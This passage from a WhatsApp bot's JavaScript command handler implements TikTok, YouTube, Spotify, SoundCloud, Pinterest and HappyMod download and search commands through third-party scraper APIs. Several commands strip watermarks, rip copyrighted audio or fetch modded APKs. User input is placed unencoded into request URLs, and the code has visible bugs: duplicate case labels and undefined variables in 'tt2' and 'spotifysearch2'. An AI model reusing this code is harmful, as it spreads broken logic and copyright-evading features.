         caption += `	◦  *Comments* : ${(json.stats.commentCount)}\n`
         caption += `	◦  *Share* : ${(json.stats.shareCount)}\n`
         caption += `	◦  *Play* : ${(json.stats.playCount)}\n`
         caption += `	◦  *Save* : ${(json.stats.saveCount)}\n`
         caption += `	◦  *Caption* : ${json.title || '-'}\n\n`
         caption += `	◦  *Fetching* : ${((new Date - old) * 1)} ms\n\n` 
RezzHost.sendMessage(m.chat,{video:{url: json.video.noWatermark }, caption: caption },{quoted:kalgans})
RezzHost.sendMessage(m.chat, { audio: { url: json.music.play_url }, mimetype: 'audio/mp4' })
}
break
case 'tiktok': case 'tiktokvideo': {
if (!text) throw 'Masukkan Query Link!'
let data = await dylux.tiktok(text)
let old = new Date()
         let json = data.result
         let caption = `${gris}[ T I K T O K - D O W N L O A D ]${gris}\n\n`
         caption += `	◦  *Id* : ${json.id}\n`
         caption += `	◦  *Username* : ${json.author.nickname}\n`
         caption += `	◦  *Title* : ${(json.title)}\n`
         caption += `	◦  *Like* : ${(json.digg_count)}\n`
         caption += `	◦  *Comments* : ${(json.comment_count)}\n`
         caption += `	◦  *Share* : ${(json.share_count)}\n`
         caption += `	◦  *Play* : ${(json.play_count)}\n`
         caption += `	◦  *Created* : ${json.create_time}\n`
         caption += `	◦  *Size* : ${json.size}\n`
         caption += `	◦  *Duration* : ${json.duration}\n`
         caption += `	◦  *Fetching* : ${((new Date - old) * 1)} ms\n\n` 
if (json.images) {
json.images.forEach(async (k) => {
await RezzHost.sendMessage(m.chat, { image: { url: k }}, { quoted: fcall });
})
} else {
RezzHost.sendMessage(m.chat,{video:{url: json.play }, caption: caption },{quoted:kalgans})
await sleep(2000)
RezzHost.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mp4' })
}
}
break
case 'tt': 
case 'tiktok': {
if (!text) return reply(`sertakan link`)
RezzHost.sendList(m.chat, "Result", "Powered By Rerez Hosting", {
title: 'PILIH FORMAT', sections: [{
title: "Pilih Format Yang Ingin Anda Unduh",
rows: [
{
title: "TikTok Video",
description: "Download Tik Tok Video",
id: `.tt-vid ${text}`
}, {
title: "TikTok Video V2",
description: "Download Tik Tok Video V2",
id: `.tt2 ${text}`
}, {
title: "TikTok Audio",
description: "Download Tik Tok Audio",
id: `.ttmp3 ${text}`
}
]
}]
})
}
break
case 'tt-vid': 
case 'tiktokvideo': {
if (!text) return reply(`masukan link tiktoknya`)
let old = new Date()
const dlt = require('./lib/scrape/tiktokdl.js')
let tiktuk = await dlt.DownloadTiktok(text)
if (tiktuk.result.images) {
tiktuk.result.images.forEach(async (k) => {
await RezzHost.sendMessage(m.chat, { image: { url: k }}, { quoted: kalgans });
})
} else {
RezzHost.sendMessage(m.chat, { video: { url: tiktuk.result.video }, caption: `${gris}[ T I K T O K - D O W N L O A D E R ]${gris}\n\n${hiasan}*Author* : ${tiktuk.result.author.nickname}\n${hiasan}*Desc* : ${tiktuk.result.desc}\n${hiasan}*Statistic* : ${tiktuk.result.statistic}\n${hiasan}*Fetching* : ${((new Date - old) * 1)} ms\n\n` }, { quoted: fverif })
}
}
break
case 'tiktok2': 
case 'tt2': {
if (!text) throw 'Masukkan Query Link!'
reply(mess.search)
let anu = await fetchJson(`https://skizo.tech/api/tiktok?apikey=${skizo}&url=${text}`)
if (anu.data.images) {
anu.data.images.forEach(async (k) => {
await RezzHost.sendMessage(m.chat, { audio: ttmp3nya, mimetype: 'audio/mp3', ptt: true }, { quoted: m})
})
} else {
RezzHost.sendMessage(m.chat,{video:{url: anu.data.hdplay },caption: mess.success },{quoted:kalgans})
}
}
break
case 'tiktokaudio':
case 'ttmp3': 
case 'tt-audio': {
await RezzHost.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
if (q === `${mesej}`) {
require('./lib/tiktok').Tiktok(q).then( data => {
const ttmp3nya = {url:data.audio}
RezzHost.sendMessage(m.chat, { audio: ttmp3nya, mimetype: 'audio/mp3', ptt: true }, { quoted: m})
})
}
}
break
case 'ytvn': {
if (isBan) return reply2(mess.ban)
await loading()
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
reply(mess.search)
 let { ytv } = require('./lib/scrape/y2mate')
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
RezzHost.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mp4', ptt: true, fileName: `${media.title}.mp3`, caption: `✇ Title : ${media.title}\n✇ File Size : ${media.filesizeF}\n✇ Url : ${isUrl(text)}\n✇ Ext : MP3\n✇ Resolusi : ${args[1] || '360p'}`, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6281288031294',
title: `REZZ BOTZZ`,
sourceUrl: `https://wa.me/6281288031294`, 
thumbnailUrl: thumburl
}
}})
}
break
case 'ytmp3': case 'youtubemp3': {
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=QfPtFMhjsi6Tccajwi7ow`
return downloadyt(text, "mp3") 
}
break
case 'ytmp4': case 'youtubemp4': {
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
return downloadyt(text, "mp4") 
}
break
case 'yts': case 'ytsearch': {
if (!isPrem) return reply(mess.owner)
if (!text) throw `Example : ${prefix + command} story wa anime`
reply(mess.search)
let search = await yts2(text)
let teks = '*YouTube Search*\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
RezzHost.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: kalgans })
}
break
case 'video': {
if (!text) throw `Example : ${prefix + command} Upin Ipin`
await loading()
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let piw = `乂 V I D E O

   ◦  Ext : Search
   ◦  ID : ${anu.videoId}
   ◦  Duration : ${anu.timestamp}
   ◦  Viewers : ${anu.views}
   ◦  Upload At : ${anu.ago}
   ◦  Author : ${anu.author.name}
   ◦  Description : ${anu.description}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: piw,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `${anu.title}`,
body: '',
thumbnailUrl: anu.thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
downloadMp4(anu.url)
}
break
case 'song': {
if (!text) throw `Example : ${prefix + command} Upin Ipin`
await loading()
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let piw = `乂 S O N G

   ◦  Ext : Search
   ◦  ID : ${anu.videoId}
   ◦  Duration : ${anu.timestamp}
   ◦  Viewers : ${anu.views}
   ◦  Upload At : ${anu.ago}
   ◦  Author : ${anu.author.name}
   ◦  Description : ${anu.description}
   
${footer}`
RezzHost.sendMessage(m.chat, {
text: piw,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `${anu.title}`,
body: '',
thumbnailUrl: anu.thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
downloadMp3(anu.url)
}
break
case 'musik': {
if (!text) return reply(`Example : ${prefix + command} Mendua`)
const xeonplaymp3 = require('./lib/scrape/ytdl2')
const { fetchBuffer } = require("./lib/myfunc2")
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await xeonplaymp3.mp3(anup3k.url)
await RezzHost.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:kalgans})
await fs.unlinkSync(pl.path)
}
break

case 'play': case 'song': {
if (!text) return reply(`Example : ${prefix + command} Mendua`)
db.data.users[m.sender].limit -= 3
let yts = require ('yt-search')
let search = await yts(`${text}`)
let linknya = search.all[0].url
let bodytextnya = `ᴛɪᴛʟᴇ : *${search.all[0].title}*\nᴠɪᴇᴡs : *${search.all[0].views}*\nᴅᴜʀᴀᴛɪᴏɴ : *${search.all[0].timestamp}*\nᴜᴘʟᴏᴀᴅᴇᴅ : *${search.all[0].ago}*\nᴜʀʟ : *${linknya}*`
            let bokepp = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bodytextnya
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : { url : search.all[0].thumbnail }}, { upload: RezzHost.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"<!> MP4 <!>","id":"${prefix}ytmp4 ${linknya}"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"<!> MP3 <!>","id":"${prefix}ytmp3 ${linknya}"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"<!> MP3 V2 <!>","id":"${prefix}play2 ${linknya}"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: wm,
                    newsletterJid: idsal,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await RezzHost.relayMessage(bokepp.key.remoteJid, bokepp.message, {
  messageId: bokepp.key.id
})
            }
            break
 case 'play2': {
    
        if (!text) throw 'Enter Title / Link From YouTube!';

        console.log("Teks yang dicari:", text);

        const look = await search(text);
        const convert = look.videos[0];

        if (!convert) throw 'Video/Audio Tidak Ditemukan';

        console.log("Video yang ditemukan:", convert);
        
    try {

        if (convert.seconds >= 36000) {
            return m.reply('Video is longer than 1 hour!');
        } else {
            let audioUrl;

            try {
                
                console.log("Mengunduh audio dari URL:", convert.url);

                audioUrl = await youtube(convert.url);
            } catch (e) {
              
                console.error("Error saat mengunduh, mencoba kembali...", e);
                m.reply('Please wait...');
                audioUrl = await youtube(convert.url);
            }

            console.log("URL audio yang berhasil diunduh:", audioUrl);
 
            await RezzHost.sendMessage(m.chat, {
                audio: {
                    url: audioUrl.mp3
                },
                mimetype: 'audio/mpeg',
                ptt: true,
                contextInfo: {
                    externalAdReply: {
                        title: convert.title,
                        body: hariini,
                        thumbnailUrl: convert.image,
                        sourceUrl: audioUrl.mp3,
                        mediaType: 1,
                        showAdAttribution: true,
                        renderLargerThumbnail: true
                    }
                }
            }, {
                quoted: m
            });

          
            console.log("Pesan audio berhasil dikirim ke chat:", m.chat);
        }
    } catch {
      if (convert.seconds >= 36000) {
            return m.reply('Video is longer than 1 hour!');
        } else {
  var wvhfe = await fetchJson("https://widipe.com/download/ytdl?url="+convert.url)
         await RezzHost.sendMessage(m.chat, {
                audio: {
                    url: wvhfe.result.mp3
                },
                mimetype: 'audio/mpeg',
                ptt: true,
                contextInfo: {
                    externalAdReply: {
                        title: convert.title,
                        body: hariini,
                        thumbnailUrl: convert.image,
                        sourceUrl: wvhfe.result.mp3,
                        mediaType: 1,
                        showAdAttribution: true,
                        renderLargerThumbnail: true
                    }
                }
            }, {
                quoted: m
            });
     }
    }
}
break;
            case 'ytplay': {
                if (!text) return m.reply("Masukkan judul lagu yang ingin dicari!")
                let se = require('./src/scrapyt')
                let res = await se.search(text)
                if (res.length === 0) return m.reply("Tidak ada hasil.")
                   let sections = [{
                        title: "Hasil Pencarian",
                        highlight_label: "Best Result",
                        rows: res.map(a => ({
                            title: a.title,
                            description: a.description,
                            id: `.youtube ${a.url}`
                        }))
                    }]
                let listMessage = {
    title: 'Click Me', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By RezzHost', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by RezzHost')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Result*\n`,
 subtitle: wm,
 hasMediaAttachment: false,
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
                break
case 'ytmp3v2': {
if (!text) return reply2(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
let data = await dylux.yta(text)
RezzHost.sendMessage(m.chat, { audio: { url: data.dl_url }, mimetype: 'audio/mp4', fileName: `${data.title}.mp3` })
}
break
case 'ytmp4v2': {
if (!text) return reply2(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
let data = await dylux.ytv(text)
RezzHost.sendMessage(m.chat, { video: { url: data.dl_url }, mimetype: 'video/mp4', fileName: `${data.title}.mp4` })
}
break
case 'spotifysearch': {
if (!text) return reply(`Example : ${prefix + command} Rewrite The Stars`)
reply(mess.search)
let spotify = await fetchJson(`https://api.caliph.biz.id/api/search/spotify?query=${text}&apikey=${caliph}`)
let teks = '乂 Spotify Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of spotify.result) {
teks += `◦  No : ${no++}\n◦  Title : ${i.title}\n◦  Artist : ${i.artist}\n◦  Duration : ${i.duration}\n◦‎  Album : ${i.album}\n◦  Url : ${i.url}\n\n─────────────────\n\n`
}
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | ${botname}`,
body: '',
thumbnailUrl: spotify.result[0].thumbnail,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'spotifysearch2': {
if (!text) return reply(`Example : ${prefix + command} Rewrite The Stars`)
await loading()
let spotifyt = await chApi.Spotifysearch(text)
let teks = '乂 Spotify Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of spotifyt) {
teks += `◦  No : ${no++}\n◦  Title : ${i.title}\n◦  Artist : ${i.artist}\n◦  Album : ${i.album}\n◦‎  Release : ${i.release_date}\n◦‎  Duration : ${i.duration}\n◦  Url : ${i.url}\n\n─────────────────\n\n`
}
RezzHost.sendMessage(m.chat, { image: { url: spotify[0].thumbnail },caption: teks }, { quoted: kalgans })
}
break
case 'spotify': {
if (!text) return reply(`Contoh : ${prefix + command} dandelion`);
let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`);
const hasil = `乂 *S P O T I F Y*

*Duration*: ${api.data[0].duration}
*Popular*: ${api.data[0].popularity}
*Url*: ${api.data[0].url}
`
RezzHost.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": '𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘',
"body": `I am RezzHost`,
"showAdAttribution": true,
"mediaType": 1,
"sourceUrl": 'saluran',
"thumbnailUrl": 'https://telegra.ph/file/50afb355fac55370492de.jpg',
"renderLargerThumbnail": true
}
}}, {quoted: kalgans})
const spodl = await fetchJson(`https://api.junn4.my.id/download/spotify?url=${api.data[0].url}`) 
const spoDl = spodl.data.download
RezzHost.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `𝙎𝙥𝙤𝙩𝙞𝙛𝙮𝙈𝙪𝙨𝙞𝙘`,
body: "",
thumbnailUrl: 'https://telegra.ph/file/d8283bf6f948413ad0e62.jpg', 
sourceUrl: hariini,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: kalgans
})
}
break
case 'spotify2':
if (!text) return reply(`Where is the link?`)
reply(mess.search)
        const Spotify = require('./lib/scrape/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return reply(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await RezzHost.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await RezzHost.sendMessage(m.chat, { audio: bufferpotify }, { quoted: kalgans })
break
case 'scloud': case 'soundcloud': {
if (!text) return reply(`Example : ${prefix + command} https://m.soundcloud.com/atlanticrecords/james-arthur-anne-marie-rewrite-the-stars`)
await loading()
let sc = await chApi.cloudownload(text)
let un = sc.data.author
let sklod = `乂 SoundCloud Download\n\n◦  Title : ${sc.data.title}\n◦  Id : ${un.id}\n◦  City : ${un.city}\n◦  Comments : ${un.comments_count}\n◦  Country : ${un.country_code}\n◦  Create : ${un.created_at}\n◦  Description : ${un.description}\n◦  Followers : ${un.followers_count}\n◦  Followings : ${un.followings_count}\n◦  First Name : ${un.first_name}\n◦  Last Name : ${un.last_name}\n◦  Permalink Url : ${un.permalink_url}\n◦  Uri : ${un.uri}\n◦  Username : ${un.username}\n◦  Kind : ${un.kind}\n◦  Likes Count : ${un.likes_count}\n◦  Playlist Likes Count : ${un.playlist_likes_count}\n◦  Verified : ${un.verified}\n\n\n${footer}`
await RezzHost.sendMessage(m.chat, { image: { url: sc.data.imageURL }, caption: sklod }, { quoted: kalgans })
RezzHost.sendMessage(m.chat, { audio: { url: sc.data.url }, mimetype: 'audio/mp4'}, { quoted: kalgans })
}
break
case 'scloud2': case 'soundcloud2': {
if (!text) return reply(`Example : ${prefix + command} https://m.soundcloud.com/atlanticrecords/james-arthur-anne-marie-rewrite-the-stars`)
reply(mess.search)
let sc = await fetchJson(`https://api.caliph.biz.id/api/soundcloud/download?url=${text}&apikey=${caliph}`)
let sklod = `乂 SoundCloud Download\n\n◦  Title : ${sc.result.title}\n◦  Id : ${sc.result.author.id}\n◦  City : ${sc.result.author.city}\n◦  Comments : ${sc.result.author.comments_count}\n◦  Country : ${sc.result.author.country_code}\n◦  Create : ${sc.result.author.created_at}\n◦  Description : ${sc.result.author.description}\n◦  Followers : ${sc.result.author.followers_count}\n◦  Followings : ${sc.result.author.followings_count}\n◦  First Name : ${sc.result.author.first_name}\n◦  Last Name : ${sc.result.author.last_name}\n◦  Permalink Url : ${sc.result.author.permalink_url}\n◦  Uri : ${sc.result.author.uri}\n◦  Username : ${sc.result.author.username}\n◦  Kind : ${sc.result.author.kind}\n◦  Likes Count : ${sc.result.author.likes_count}\n◦  Playlist Likes Count : ${sc.result.author.playlist_likes_count}\n◦  Verified : ${sc.result.author.verified}\n\n${footer}`
await RezzHost.sendMessage(m.chat, { image: { url: sc.result.imageURL }, caption: sklod }, { quoted: kalgans })
RezzHost.sendMessage(m.chat, { audio: { url: sc.result.url }, mimetype: 'audio/mp4'}, { quoted: kalgans })
}
break
case 'soundcloudsearch': case 'scsearch': {
if(!isCreator) return reply2(mess.owner)
if(!text) return reply2(`${command} Secukupnya`)
let sound = await fetchJson(`https://api.yanzbotz.my.id/api/cari/soundcloud?query=${text}`)
let txt = `*🎵 LIST SOUND CLOUDE  🎵*\n\n`
for (let bntgg of sound.result.data) {
txt += `   ◦  *Title :* ${bntgg.title}\n`
txt += `   ◦  *Artist :* ${bntgg.artist}\n`
txt += `   ◦  *Genre :* ${bntgg.genre}\n`
txt += `   ◦  *Durasi :* ${bntgg.duration}\n`
txt += `   ◦  *Plays :* ${bntgg.plays}\n`
txt += `   ◦  *Like:* ${bntgg.likes}\n`
txt += `   ◦  *Coment :* ${bntgg.comments}\n`
txt += `   ◦  *Url :* ${bntgg.url}\n\n`
}
reply2(txt)
}
break
case 'cocofun2': {
if (!text) return reply(`Example: ${prefix + command} https://www.icocofun.com/share/post/565326210234?lang=id&pkg=id&share_to=copy_link&m=06fa9a57a737be2bee99bea6bcdb20ee&d=7a1c5048f54ef09b7c0fa0f3c463692949f35fa30d93fc1130f6e8153f537b51&nt=1`)
reply(mess.getdata)
let old = new Date()
let asy = await chApi.cocofun(text)
let caption = `乂  *C O C O F U N*\n\n`
caption += `	◦  *Topic* : ${asy.topic}\n`
caption += `	◦  *Caption* : ${asy.caption}\n`
caption += `	◦  *Play* : ${asy.play}\n`
caption += `	◦  *Like* : ${asy.like}\n`
caption += `	◦  *Share* : ${asy.share}\n`
caption += `	◦  *Duration* : ${asy.duration}\n\n`
caption += `	◦  *Fetching* : ${((new Date - old) * 1)} ms\n\n` 
RezzHost.sendMessage(m.chat, { video: { url: asy.no_watermark }, caption: caption }, { quoted: kalgans })
}
break
case 'cocofun':
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply('where is the link')
reply(mess.search)
let j = await fetchJson(`https://api.lolhuman.xyz/api/cocofun?apikey=${apikey}&url=${q}`)
RezzHost.sendMessage(m.chat, {
video: {
url: j.result.nowm
},
caption: j.result.tag
}, {
quoted: kalgans
})
break
case 'snackvideo':
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply('where is the link')
reply(mess.search)
let ma = await fetchJson(`https://api.lolhuman.xyz/api/snackvideo?apikey=${apikey}&url=${q}`)
RezzHost.sendMessage(m.chat, {
video: {
url: ma.result.url
},
caption: ma.result.caption
}, {
quoted: kalgans
})
break
case 'ringtone':{
if (!text) return reply(`Example : ${command} black rover`)
reply(mess.search)
let { ringtone } = require('./lib/scrape/scraper')
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
RezzHost.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: kalgans })
}
break
case 'wattpad':
if (args.length == 0) return reply(`Example: ${command} https://www.wattpad.com/707367860-kumpuLan-quote-tere-liye-tere-liye-quote-quote`)
reply(mess.search)
let get = await fetchJson(`https://api.lolhuman.xyz/api/wattpad?apikey=${apikey}&url=${args[0]}`)
get = get.result
ini_txt = `乂 W A T T P A D\n\n`
ini_txt += `   ◦  Title : ${get.title}\n`
ini_txt += `   ◦  Rating : ${get.rating}\n`
ini_txt += `   ◦  Motify date : ${get.modifyDate}\n`
ini_txt += `   ◦  Create date: ${get.createDate}\n`
ini_txt += `   ◦  Word : ${get.word}\n`
ini_txt += `   ◦  Comment : ${get.comment}\n`
ini_txt += `   ◦  Vote : ${get.vote}\n`
ini_txt += `   ◦  Reader : ${get.reader}\n`
ini_txt += `   ◦  Pages : ${get.pages}\n`
ini_txt += `   ◦  Description : ${get.desc}\n\n`
ini_txt += `   ◦  Story : \n${get.story}\n\n`
ini_txt += `${footer}`
thumbnail = await getBuffer(get.photo)
RezzHost.sendImage(m.chat, thumbnail, `${ini_txt}`, kalgans)
break
case 'wattpadsearch':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example ${prefix+command} tere liye`)
reply(mess.search)
let wat = await scp2.wattpad(q)
reply(util.format(wat))
}
break
case 'happymoddl': {
if (!isCreator) return reply(mess.owner)
if (!text) throw `Example : ${prefix + command} link`
await loading ()
reply(mess.search)
let anja = await scp2.happymoddl(text)
RezzHost.sendMessage(m.chat, { document : { url : anja.download }, fileName : `${anja.title}.apk`, mimetype: 'application' }, { quoted : kalgans })
}
break
case 'happymod':{
if (!isRegistered) return reply2(mess.regis)
if (!q) return reply(`Example ${prefix+command} Sufway surfer mod`)
reply(mess.search)
let kat = await scp2.happymod(q)
let teks = `乂 *H A P P Y M O D - S E A R C H*\n\n`
kat.data.map((v, i) => {
teks += `${i+1}. ${v.judul}\n`
teks += `*Judul* : ${v.judul}\n`
teks += `*Rating* : ${v.rating}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
reply(teks)
}
break

 case 'pin': case 'pinterest': {
if (!q) return reply(`Example :* ${prefix+command} Tobrut`)
  await m.reply(mess.wait);

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: RezzHost.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res);
  let ult = res.splice(0, 10);
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `• VPS\n• PANEL PETRODACTYL\n• SECRIP BOT WHATSAPP\n• DAN MASIH BANYAK LAGI`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: ownername
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'REREZ HOSTING MENYEDIAKAN :',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"MY OWNER","url":"https://wa.me/${owner}","merchant_url":"https://www.google.com"}`
          }, {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"GC OWNER","url":"${gr}","merchant_url":"https://www.google.com"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'HASIL PENCARIAN REZZ BOTZ'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await RezzHost.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break
case 'unsplash2': {
if (!text) return reply(`Example: ${prefix + command} panda`)
reply(mess.search)
let old = new Date()
const json = await fetchJson(`https://vihangayt.me/search/unsplash?q=${text}`)
for (let i = 0; i < 5; i++) {
var rand = Math.floor(json.data.length * Math.random())
RezzHost.sendMessage(m.chat, { image: { url: json.data[rand] }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
await sleep(2000)
}
}
break
case 'giphy': {
if (!text) return reply(`Example: ${prefix + command} panda`)
reply(mess.search)
let old = new Date()
const json = await fetchJson(`https://api.xfarr.com/api/search/tenor?apikey=${xfarApi}&query=${text}&limit=5`)
for (let i = 0; i < 5; i++) {
var rand = Math.floor(json.result.length * Math.random())
RezzHost.sendMessage(m.chat, { video: { url: json.result[rand].url, caption: `*Title: ${json.result[rand].title}\n\n\n🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, gifPlayback: true }, { quoted:kalgans })
await sleep(2000)
}
}
break
case 'pixabay': {
if (!text) return reply(`Example: ${prefix + command} panda`)
reply(mess.search)
let old = new Date()
const json = await fetchJson(`https://vihangayt.me/search/pixabay?q=${text}`)
for (let i = 0; i < 3; i++) {
var rand = Math.floor(json.data.length * Math.random())
RezzHost.sendMessage(m.chat, { image: { url: json.data[rand] }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
await sleep(2000)
}
}
break
case 'pinterest2': {
if (!text) return reply(`Example: ${prefix + command} panda`)
let old = new Date()
let { pinterest } = require('./lib/scrape/scraper')
 let anu = await pinterest(text)
 let result = anu[Math.floor(Math.random() * anu.length)] 
RezzHost.sendMessage(m.chat, { image: { url: result }, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted: kalgans })
}
break
case 'getmusic': {
if (!isCreator) return reply(mess.owner)
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
await loading ()
downloadMp3(urls[text - 1])
}
break
case 'getvideo': {
